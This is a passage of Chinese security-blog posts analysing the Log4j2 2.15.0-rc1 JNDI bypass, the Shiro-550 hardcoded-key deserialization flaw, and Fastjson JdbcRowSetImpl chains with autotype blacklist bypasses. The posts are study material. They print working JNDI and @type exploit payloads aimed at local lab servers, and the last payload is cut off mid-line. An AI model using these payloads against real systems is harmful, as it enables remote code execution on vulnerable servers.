src="/posts/6e79ce8b/l-68.png" title="newInstance"></p><p>先看<code>lookups</code>变量的调用方法<code>loadLookups</code>，要求传入的参数等于<code>lookups</code></p><p><img src="/posts/6e79ce8b/l-69.png" title="loadLookups"></p><p>参数为图中的buffer</p><p><img src="/posts/6e79ce8b/l-60.png" title="格式化步骤"></p><p>另外一个条件存在config，即为上图中的event，自然是存在的</p><p>现在思路比较清晰，需要实施的事：</p><ul><li>调用<code>MessagePatternConverter</code>类的<code>newInstance</code>方法，传递<code>event</code>参数和<code>buffer</code>参数，其中<code>buffer</code>参数值要为<code>lookups</code></li></ul><p>这里借用天下大木头师傅的开启payload：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4jTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        logger.error(&quot;$&#123;jndi:ldap://localhost:9998/#EvilPayload&#125;&quot;);</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultConfiguration</span>();</span><br><span class="line">        <span class="type">MessagePatternConverter</span> <span class="variable">messagePatternConverter</span> <span class="operator">=</span> MessagePatternConverter.newInstance(configuration,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;lookups&quot;</span>&#125;);</span><br><span class="line">        <span class="type">LogEvent</span> <span class="variable">logEvent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MutableLogEvent</span>(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;$&#123;jndi:ldap://localhost:9998/ EvilPayload&#125;&quot;</span>),<span class="literal">null</span>);</span><br><span class="line">        messagePatternConverter.format(logEvent,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;$&#123;jndi:ldap://localhost:9998/ EvilPayload&#125;&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网上还有种开启方式则是在动态调试中对option进行修改值</p><p>按上面的payload在最后一步进行下断点<br>还是跟2.14.0版本步骤一样替换截选步骤，下面步骤一样，就不跟着分析了</p><p><img src="/posts/6e79ce8b/l-70.png" title="replaceIn"><br><img src="/posts/6e79ce8b/l-71.png" title="替换截选"><br><img src="/posts/6e79ce8b/l-72.png" title="resolveVariable"></p><p>调用jndi.lookup</p><p><img src="/posts/6e79ce8b/l-73.png" title="jndi.lookup"><br><img src="/posts/6e79ce8b/l-74.png" title="jndi.lookup"></p><p>一直到调用到jndiManager.lookup方法</p><p><img src="/posts/6e79ce8b/l-75.png" title="jndiManager.lookup"></p><p>这里协议仅允许java、ldap、ldaps，并且仅允许本地访问</p><p><img src="/posts/6e79ce8b/l-76.png" title="白名单限制"></p><p>如果遇到报错则进入报错体，由于cr1版本的catch为空，因此只要让他报错就能绕过上面的白名单限制</p><p><img src="/posts/6e79ce8b/l-77.png" title="catch为空"></p><p>因此payload可以输下面举例等方式达到报错进入catch体中，变式payload在github上有很多就不一一列举了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//localhost:9998/ EvilPayload&#125;</span></span><br><span class="line">$&#123;jndi:ldap:<span class="comment">//localhost:9998/\$EvilPayload&#125;</span></span><br></pre></td></tr></table></figure><p>最后运行lookup方法触发漏洞（当前版本为2.15.0版本，rc1环境有问题，就不贴触发截图了）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (T) <span class="built_in">this</span>.context.lookup(name);</span><br></pre></td></tr></table></figure><p>整体来说除非服务器端更改了配置文件，默认情况开发也不会更改，因此存在漏洞的服务器少了很多的，利用难度也增加了许多，不过可以学习下绕过思路还是能学到很多东西</p><h1 id="0x08、2-15-0-rc2修复"><a href="#0x08、2-15-0-rc2修复" class="headerlink" title="0x08、2.15.0-rc2修复"></a>0x08、2.15.0-rc2修复</h1><p>rc2为rc1的修复补丁，在<code>catch</code>异常体中添加了返回值<code>null</code>，至此rc1漏洞修复</p><p><img src="/posts/6e79ce8b/l-77.png" title="catch返回null"><br><img src="/posts/6e79ce8b/l-78.png" title="catch返回null"></p><h1 id="0x09、总结"><a href="#0x09、总结" class="headerlink" title="0x09、总结"></a>0x09、总结</h1><p>整体流程下来主要是对日志信息进行截取替换选取出${}的内容，再根据内容头的协议调用协议对应的lookup方法导致jndi注入，流程链比较长，但核心链比较容易理解和跟踪；rc1则是默认关闭jndi-lookup方法，并且更换了转换器去处理日志信息，并增加了白名单机值去处理lookup访问请求，但由于catch抛出异常体未做处理导致可以绕过，利用环境也更难，总之还是能学到很多东西。</p><h1 id="0x10、参考链接"><a href="#0x10、参考链接" class="headerlink" title="0x10、参考链接"></a>0x10、参考链接</h1><p><a href="https://su18.org/post/log4j2/">https://su18.org/post/log4j2/</a><br><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/els4r7">https://www.yuque.com/tianxiadamutou/zcfd4v/els4r7</a><br><a href="https://blog.csdn.net/cdyunaq/article/details/121927991">https://blog.csdn.net/cdyunaq/article/details/121927991</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-Shiro550漏洞原理学习与分析</title>
      <link href="/posts/10575800.html"/>
      <url>/posts/10575800.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>原理篇到Shiro部分，继续学习分析</p><h1 id="0x01、Shiro描述"><a href="#0x01、Shiro描述" class="headerlink" title="0x01、Shiro描述"></a>0x01、Shiro描述</h1><p>引用官方的描述：</p><blockquote><p>Apache Shiro是一个强大的和易于使用的Java安全框架，执行认证、授权、加密和会议管理和可用于安全的任何应用程序从命令行应用程序、移动应用程序的最大网络和企业应用程序。 </p></blockquote><p>Shiro提供程序安全API执行以下方面：</p><ul><li>认证-证明用户身份、通常称为用户”登录”</li><li>授权-访问控制</li><li>密码保护-从监视中保护或隐藏的数据</li><li>会议管理-每个用户时间敏感的状态</li></ul><p>Shiro官网：<a href="https://shiro.apache.org/">https://shiro.apache.org/</a></p><p>Shiro有三个核心组件：Subject, SecurityManager 和 Realms.</p><p><img src="/posts/10575800/s-1.png" title="核心组件"></p><p><strong>Subject</strong>：即“当前操作用户”。但是，在Shiro中，Subject这一概念并不仅仅指人，也可以是第三方进程、后台帐户（Daemon Account）或其他类似事物。它仅仅意味着“当前跟软件交互的东西”。</p><p>Subject代表了当前用户的安全操作，SecurityManager则管理所有用户的安全操作。</p><p><strong>SecurityManager</strong>：它是Shiro框架的核心，典型的Facade模式，Shiro通过SecurityManager来管理内部组件实例，并通过它来提供安全管理的各种服务。</p><p><strong>Realm</strong>： Realm充当了Shiro与应用安全数据间的“桥梁”或者“连接器”。也就是说，当对用户执行认证（登录）和授权（访问控制）验证时，Shiro会从应用配置的Realm中查找用户及其权限信息。</p><p>更多描述可以查看<a href="https://blog.csdn.net/MinggeQingchun/article/details/126414384">这篇文章</a></p><h1 id="0x02、环境搭建"><a href="#0x02、环境搭建" class="headerlink" title="0x02、环境搭建"></a>0x02、环境搭建</h1><p>可以直接从Github下载shiro漏洞环境或者从vulhub下载，<a href="https://github.com/apache/shiro">https://github.com/apache/shiro</a></p><p>项目丢进idea后，添加运行配置添加tomcat服务器，添加war包</p><p><img src="/posts/10575800/s-2.png" title="运行配置"><br><img src="/posts/10575800/s-3.png" title="运行配置"></p><p>再更改pom.xml文件，讲jstl改为1.2版本，再添加利用链的包</p><p><img src="/posts/10575800/s-4.png" title="组件设置"><br><img src="/posts/10575800/s-5.png" title="组件设置"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;!--  添加可以利用的jar包--&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">    &lt;!--  这里需要将jstl设置为<span class="number">1.2</span> --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>同步更新完mvn后，开启服务即可</p><p><img src="/posts/10575800/s-6.png" title="开启服务"></p><h1 id="0x02、Shiro550漏洞分析"><a href="#0x02、Shiro550漏洞分析" class="headerlink" title="0x02、Shiro550漏洞分析"></a>0x02、Shiro550漏洞分析</h1><h2 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h2><ul><li>Shiro &lt;&#x3D; 1.2.4</li></ul><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Shiro采用AES对称加密，将默认密钥key硬编码在代码中，用户使用rememberMe功能提交数据时，服务器会将rememberMe值使用默认密钥key进行AES解密，将解密后的字符串进行反序列化读取，用户使用硬编码的key进行AES加密后发送给服务器进行AES解密，服务器反序列化读取时触发漏洞。</p><p>原理很好理解，核心问题就是硬编码Key，用户知道key并且服务器存在利用链就能执行恶意代码</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里可以直接模拟工具发送payload进行断点分析，如果选择暴破的话，第一个包为<code>rememberMe=yes</code>，来判断是否使用shiro组件，然后再是使用key进行加密发送，这里直接分析key加密的数据包</p><p><img src="/posts/10575800/s-10.png" title="发送payload"></p><p>在<code>rememberMe</code>核心处理方法（<code>AbstractRememberMeManager#getRememberedPrincipals</code>）进行断点分析</p><p><img src="/posts/10575800/s-8.png" title="getRememberedPrincipals"></p><p>该方法首先会调用<code>getRememberedSerializedIdentity</code>方法处理数据内容，跟进</p><p>该方法获取数据内容的请求和响应内容然后读取<code>cookie</code></p><p><img src="/posts/10575800/s-9.png" title="getcookie"></p><p>跟进<code>readValue</code>方法，获取请求头中的<code>cookie</code>，然后再获取<code>cookie</code>值，最后返回值</p><p><img src="/posts/10575800/s-11.png" title="getcookie"></p><p>接着<code>base64</code>解码<code>rememberMe</code>值</p><p><img src="/posts/10575800/s-12.png" title="decode"></p><p>这里就是<code>base64</code>解码的流程，先转化成字节，然后进行解码</p><p><img src="/posts/10575800/s-13.png" title="decode"></p><p>最后返回字节码数组</p><p><img src="/posts/10575800/s-14.png" title="decode"></p><p>然后调用<code>convertBytesToPrincipals</code>方法，跟进，调用<code>decrypt</code>解码字节数据</p><p><img src="/posts/10575800/s-15.png" title="decrypt"></p><p>该方法中会调用AES解码，AES解码的Key通过<code>getDecryptionCipherKey()</code>方法获取</p><p><img src="/posts/10575800/s-16.png" title="AES解码"></p><p><code>getDecryptionCipherKey()</code>方法直接返回了<code>key</code>值，也就是说<code>Key</code>值在调用<code>getDecryptionCipherKey</code>方法前就已经复制给了变量</p><p><img src="/posts/10575800/s-17.png" title="key获取"></p><p>这里正向解析清楚一些，在调用<code>AbstractRememberMeManager#getDecryptionCipherKey</code>方法时，<code>AbstractRememberMeManager</code>实例化会调用构造方法</p><p><img src="/posts/10575800/s-18.png" title="构造方法"></p><p>其中会调用<code>setCipherKey</code>方法讲默认值进行传递，默认值就是默认的<code>Key</code>值进行<code>base64</code>转换从字节数组</p><p><img src="/posts/10575800/s-19.png" title="默认key"></p><p><code>setCipherKey</code>方法会将<code>key</code>传递给<code>setEncryptionCipherKey</code>和<code>setDecryptionCipherKey</code>方法设置为加解密的值</p><p><img src="/posts/10575800/s-20.png" title="设置加解密key"></p><p>然后<code>setDecryptionCipherKey</code>方法将<code>key</code>复制给<code>decryptionCipherKey</code>，最后<code>getDecryptionCipherKey</code>方法获取到解密<code>key</code>值</p><p><img src="/posts/10575800/s-21.png" title="获取到解密key"></p><p>回到<code>decrypt</code>方法，获取到解密<code>key</code>后，调用AES的<code>decrypt</code>方法进行解码</p><p>计算出<code>iv</code>值（初始化向量），再调用带<code>iv</code>参数的<code>decrypt</code>方法</p><p><img src="/posts/10575800/s-22.png" title="decrypt"></p><p>跟进后，调用<code>crypt</code>方法解析内容</p><p><img src="/posts/10575800/s-23.png" title="crypt"></p><p>跟进<code>crypt</code>方法，调用<code>initNewCipher</code>方法获取<code>cipher</code>（获取加密方式的对象）</p><p><img src="/posts/10575800/s-24.png" title="crypt"><br><img src="/posts/10575800/s-25.png" title="crypt"></p><p>调用<code>doFinal</code>方法解码数据，返回解析内容</p><p><img src="/posts/10575800/s-26.png" title="得到解码数据"></p><p>上一层获取后，经过转换为字节码，然后返回序列化数据</p><p><img src="/posts/10575800/s-27.png" title="序列化数据"><br><img src="/posts/10575800/s-28.png" title="序列化数据"></p><p>返回给上一层，拿到序列化数据后，进行反序列化</p><p><img src="/posts/10575800/s-29.png" title="反序列化数据"></p><p>跟进反序列化方法，获取默认反序列化器然后调用反序列化器的<code>deserialize</code>反序列化方法</p><p><img src="/posts/10575800/s-30.png" title="反序列化数据"></p><p>进行反序列化，也就是漏洞触发点</p><p><img src="/posts/10575800/s-31.png" title="反序列化数据"></p><p>最后返回序列化对象，如果反序列化过程抛出异常，则会最后会调用<code>removeFrom</code>方法将<code>rememberMe=deleteMe</code>添加到响应头当中，导致<code>key</code>检测失败</p><p><img src="/posts/10575800/s-34.png" title="抛出异常"></p><p>避免这个问题，需要将设定不会报错的序列化类（属于<code>PrincipalCollection</code>类），可以将恶意类生成的对象属于<code>PrincipalCollection</code>类，返回序列化对象即可</p><p><img src="/posts/10575800/s-36.png" title="PrincipalCollection"></p><p>工具暴破<code>key</code>使用<code>SimplePrincipalCollection</code>类来规避这个问题，因此反序列化过程不会报错</p><p><img src="/posts/10575800/s-37.png" title="SimplePrincipalCollection"></p><p>直到执行结束，响应头中没有<code>rememberMe=deleteMe</code>字段，证明<code>Key</code>正确，显示出暴破出的<code>key</code></p><p><img src="/posts/10575800/s-32.png" title="暴破出到key"></p><p>如果<code>key</code>错误，在解码过程中会抛出异常</p><p><img src="/posts/10575800/s-35.png" title="key错误"></p><p>抛出异常的过程中最后会调用<code>removeFrom</code>方法将<code>rememberMe=deleteMe</code>添加到响应头当中</p><p><img src="/posts/10575800/s-34.png" title="抛出异常"></p><p>利用链流程一样，在<code>readObject</code>时触发漏洞，执行完成，链存在，然后再抛出异常反序列化数据不可用，但反序列化已经执行，报错问题不重要</p><p><img src="/posts/10575800/s-33.png" title="暴破出到利用链"></p><p>不用工具的利用方式，将利用链进行<code>bytes</code>编码，然后和<code>key</code>值经过<code>base64</code>解码成字节数组，使用AES加密即可得到<code>rememberMe</code>字段值</p><h2 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h2><p>shiro处理过程：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">获取请求内容，读取cookie值</span><br><span class="line">    -&gt;通过Base64解码将值转换从字节数组</span><br><span class="line">        -&gt;调用AES解码，用默认key对字节数组进行解码（key如果错误，抛出异常，向cookie头中添加rememberMe=deleteMe）</span><br><span class="line">            -&gt;计算初始化向量iv，然后带入AES-CBC模式进行解码返回原始序列化数据</span><br><span class="line">                -&gt;使用默认反序列化器对序列化数据进行反序列化读取</span><br><span class="line">                    -&gt;调用readObject反序列化数据触发漏洞</span><br></pre></td></tr></table></figure><p>检测key过程：<br>使用<code>SimplePrincipalCollection</code>类序列化数据，使用<code>Key</code>进行AES加密后发送，如果响应头不存在<code>rememberMe=deleteMe</code>字段，则表明<code>key</code>正确，反之<code>key</code>错误。</p><h1 id="0x03、总结"><a href="#0x03、总结" class="headerlink" title="0x03、总结"></a>0x03、总结</h1><p>Shiro550原理理解起来比较简单，调用过程也没有那么复杂，核心问题还是硬编码key。</p><h1 id="0x04、参考链接"><a href="#0x04、参考链接" class="headerlink" title="0x04、参考链接"></a>0x04、参考链接</h1><p><a href="https://blog.csdn.net/MinggeQingchun/article/details/126414384">https://blog.csdn.net/MinggeQingchun/article/details/126414384</a><br><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v">https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-Fastjson-JdbcRowSetImpl利用链及高版本绕过分析</title>
      <link href="/posts/ad3be000.html"/>
      <url>/posts/ad3be000.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>这个内容网上学习文章很多，跟着走一遍理下原理思路</p><h1 id="0x01、JdbcRowSetImpl利用链分析"><a href="#0x01、JdbcRowSetImpl利用链分析" class="headerlink" title="0x01、JdbcRowSetImpl利用链分析"></a>0x01、JdbcRowSetImpl利用链分析</h1><h2 id="一、知识前提"><a href="#一、知识前提" class="headerlink" title="一、知识前提"></a>一、知识前提</h2><p>前置知识（JNDI、RMI、LDAP）已经在<a href="https://okaytc.github.io/posts/ad3be040.html">这篇学习</a>了<br>Fastjson的基础知识在<a href="https://okaytc.github.io/posts/ad3be047.html">这篇学习</a>了</p><p>其它没什么，先看<code>JdbcRowSetImpl</code>利用链的<code>Payload</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload_jdbc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>json参数为三个：<code>com.sun.rowset.JdbcRowSetImpl类名</code>、<code>dataSourceName</code>、<code>autoCommit</code></p><p>影响范围：<br>1、fastjson &lt;&#x3D; 1.2.24</p><p>2、jdk版本：<br>JNDI-RMI:<br><font color="red">JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121</font>开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。<br><font color="red">JDK 6u132, JDK 7u122, JDK 8u113</font>开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了false。<br>JNDI-LDAP:<br>2018年10月，Java修复了该利用点，对LDAP Reference远程工厂类的加载增加了限制<br>范围：<font color="red">Oracle JDK 11.0.1、8u191、7u201、6u211</font>之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，需要人工调整至true</p><p>该链使用场景:<br>需要出网、通过JNDI远程加载RMI&#x2F;LDAP，版本要求同RMI&#x2F;LDAP限制版本一样，高版本会默认关闭远程地址，只有手动添加信任地址进行调用。</p><h2 id="二、JdbcRowSetImpl本身"><a href="#二、JdbcRowSetImpl本身" class="headerlink" title="二、JdbcRowSetImpl本身"></a>二、JdbcRowSetImpl本身</h2><p>JdbcRowSetImpl链相比较其他链还是比较好理解的</p><p>触发点在<code>setAutoCommit</code>方法</p><p><img src="/posts/ad3be000/fj-1.png" title="setAutoCommit"></p><p>这里有个<code>conn</code>变量，用来获取对象连接，默认值为<code>null</code>未赋值，会进入到<code>else</code>代码段中，调用<code>connect()</code>方法</p><p><img src="/posts/ad3be000/fj-2.png" title="connect"></p><p><code>connect</code>方法的本意为获取<code>jdbc</code>连接，其中调用了JNDI远程调用地址</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource)ctx.lookup</span><br><span class="line">    (getDataSourceName());</span><br></pre></td></tr></table></figure><p>调用地址通过<code>getDataSourceName()</code>获取，因此如果<code>DataSourceName</code>变量可控，传入<code>DataSourceName</code>为恶意远程jndi服务，进行<code>lookup</code>调用时即可触发漏洞。</p><p>如下效果：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JdbcRowSetImpl jr=<span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">jr.setDataSourceName(<span class="string">&quot;rmi://127.0.0.1:1099/RMIObject&quot;</span>);</span><br><span class="line">System.out.println(jr.getDataSourceName());</span><br><span class="line">jr.setAutoCommit(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be000/fj-3.png" title="触发漏洞"></p><h2 id="三、Fastjson-JdbcRowSetImpl"><a href="#三、Fastjson-JdbcRowSetImpl" class="headerlink" title="三、Fastjson-JdbcRowSetImpl"></a>三、Fastjson-JdbcRowSetImpl</h2><p>前面提到，只要传入<code>DataSourceName</code>名，同时调用<code>setAutoCommit</code>方法即可触发漏洞</p><p>回顾fastjson大体执行步骤：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON对象解析</span><br><span class="line">  -&gt;创建默认JSON解析器parser（方法：DefaultJSONParser）</span><br><span class="line">    -&gt;对解析器pareser进行解析序列化解析（方法：parseObject）</span><br><span class="line">      -&gt;根据token获取对应反序列化器deserializer（方法：getDeserializer）</span><br><span class="line">        -&gt;对反序列化器deserializer进行反序列化解析（方法：deserialize）</span><br><span class="line">          -&gt;对对象和方法名进行解析（方法：pareseObject）</span><br><span class="line">            -&gt;获取key值(@type)，类加载key对象Class</span><br><span class="line">              -&gt;搜寻类对象的反序列化器</span><br><span class="line">                -&gt;搜寻不到，再创建反序列化器（方法：createJavaBeanDeserializer）</span><br><span class="line">                -&gt;过程中，build javabeaninfo信息，存储setter/getter信息放入Fieldlist中</span><br><span class="line">                -&gt;过程中，对Fieldlist字段进行创建字段反序列化器createFieldDeserializer</span><br><span class="line">                -&gt;最后反序列化器JavaBeanDeserializer创建成功</span><br><span class="line">                  -&gt;正式对反序列化器进行反序列化操作(方法：deserialize)</span><br><span class="line">                    -&gt;通过sortedFieldDeserializers获取字段数据，然后实例化对象</span><br><span class="line">                      -&gt;解析对象字段属性进行模糊匹配查找属性前缀get/set是否存在，&quot;_&quot;符号进行删除等操作</span><br><span class="line">                        -&gt;对方法查找方法的反序列化器（方法：getFieldDeserializer）</span><br><span class="line">                          -&gt;通过方法反序列化器对方法属性进行解析(获取到类方法名)，通过setValue方法给字段赋值</span><br><span class="line">                            -&gt;通过反射调用执行方法</span><br></pre></td></tr></table></figure><p>这里主要分析<code>DataSourceName</code>的赋值以及<code>setAutoCommit</code>方法的调用，因为前大半段获取序列化器的流程在<a href="https://okaytc.github.io/posts/ad3be047.html">这篇分析</a>分析过了，流程一样，就分析一下后面触发的地方</p><p>跟进到模糊查询方法属性步骤，循环查询方法属性，先是匹配查询<code>dataSourceName</code>字段</p><p><img src="/posts/ad3be000/fj-4.png" title="smart"></p><p>通过<code>getFieldDeserializer</code>方法获取属性的解析器</p><p><img src="/posts/ad3be000/fj-5.png" title="getFieldDeserializer"></p><p>在<code>sortedFieldDeserializers</code>数组中找到字段解析器</p><p><img src="/posts/ad3be000/fj-6.png" title="sortedFieldDeserializers"></p><p>解析器找到后，对属性进行解析</p><p><img src="/posts/ad3be000/fj-7.png" title="parseField"></p><p>调用属性值解析器对属性值进行解析（获取字段的值）</p><p><img src="/posts/ad3be000/fj-8.png" title="deserialze"></p><p>获取到值过后，调用<code>setValue</code>方法进行赋值</p><p><img src="/posts/ad3be000/fj-9.png" title="deserialze"></p><p>通过反射获取方法名，再调用执行完成赋值</p><p><img src="/posts/ad3be000/fj-10.png" title="invoke"></p><p><code>dataSourceName</code>字段处理就完成，<code>AutoCommit</code>方法跟上面一样，就不重复写过程了</p><p><code>invoke</code>调用<code>setAutoCommit</code>方法，触发漏洞</p><p><img src="/posts/ad3be000/fj-11.png" title="invoke"></p><p><img src="/posts/ad3be000/fj-12.png" title="invoke"></p><h1 id="0x02、fastjson高版本绕过分析"><a href="#0x02、fastjson高版本绕过分析" class="headerlink" title="0x02、fastjson高版本绕过分析"></a>0x02、fastjson高版本绕过分析</h1><h2 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h2><p>1.2.24-41，更新情况：</p><ul><li>autotype默认关闭</li><li>添加 checkAutoType 方法进行黑白名单处理加载类</li></ul><p>版本更新至1.2.25-1.2.41区间中，再次运行会提示<code>autotype</code>不支持<br><img src="/posts/ad3be000/fj-13.png" title="错误"></p><p><img src="/posts/ad3be000/fj-14.png" title="checkautotype"></p><p><code>autotype</code>也是默认关闭的，需要手动开启</p><p><img src="/posts/ad3be000/fj-15.png" title="autotype"></p><p>然后经过白名单（白名单列表为空）循环判断，再经过黑名单循环判断，白名单会直接加载类，黑名单匹配会直接抛出异常</p><p><img src="/posts/ad3be000/fj-16.png" title="autotype"></p><p>黑名单的类：</p><p><img src="/posts/ad3be000/fj-17.png" title="autotype"></p><p>如果不是黑名单的类会到类加载步骤</p><p><img src="/posts/ad3be000/fj-18.png" title="loadClass"></p><p>其中会经过两个处理：</p><ul><li>开头为[符号，会将其删除然后再进行类加载</li><li>开头为L，结尾为;分号，会将其删除然后在进行类加载</li></ul><p>绕过思路就可以将类进行上述两种方法构造：</p><ul><li>“@type”:”Lcom.sun.rowset.JdbcRowSetImpl;”</li><li>“@type”:”[com.sun.rowset.JdbcRowSetImpl”</li></ul><p>然后手动开启autotype即可，得到payload：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;, \&quot;autoCommit\&quot;:true&#125;\&quot;;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;, \&quot;autoCommit\&quot;:true&#125;\&quot;;&quot;</span>;</span><br><span class="line">    JSON.parse(payload);</span><br></pre></td></tr></table></figure><p>但实际使用[为开头的方式会报错，遇到<code>parseArray</code>的时候会抛出异常</p><p><img src="/posts/ad3be000/fj-19.png" title="抛出异常"></p><p>提示在位置42处缺少[号,及第一个逗号的位置</p><p><img src="/posts/ad3be000/fj-21.png" title="抛出异常"></p><p>添加[符号<br><code>String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;[, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;, \&quot;autoCommit\&quot;:true&#125;\&quot;;&quot;;</code></p><p>运行提示44位置缺少{符号，继续添加</p><p><img src="/posts/ad3be000/fj-27.png" title="绕过"></p><p><code>String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RMIObject\&quot;, \&quot;autoCommit\&quot;:true&#125;\&quot;;&quot;;</code></p><p>执行成功</p><p><img src="/posts/ad3be000/fj-28.png" title="绕过"></p><p>使用L开头;结尾的形式能正常绕过</p><p><img src="/posts/ad3be000/fj-20.png" title="正常绕过"></p><p>得到最后的payload：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;, 